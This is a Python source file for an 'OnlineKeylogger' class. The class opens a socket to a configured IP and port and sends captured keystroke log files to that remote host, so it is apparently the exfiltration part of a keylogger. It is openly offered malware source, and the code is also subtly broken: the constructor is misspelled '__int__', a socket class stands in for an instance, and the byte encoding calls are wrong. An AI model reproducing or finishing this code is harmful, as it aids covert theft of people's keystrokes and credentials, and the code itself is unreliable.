import socket
from src.functions.listener import *
from src.encryption.encryptionsys import *
import shutil


class OnlineKeylogger:
    def __int__(self, config):
        self.port = config["port"]
        self.ip = config["ip"]
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.socket = socket.socket()
        self.client = socket.socket

    def send(self, args, encode):
        return self.socket.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        if encode is not None:
            receive = self.client.recv(size).decode(encode)
        else:
            receive = self.client.recv(size)

        return receive

    def transfer(self, file):
        file_size = os.path.getsize(file)

        self.send(str(file_size), self._ENCODING_FORMAT)
        logs = open(file, "rb")
        file_bytes = logs.read(file_size)
        while True:
            if bytes:
                self.client.send(file_bytes)
                logs.close()
                break
            else:
                break
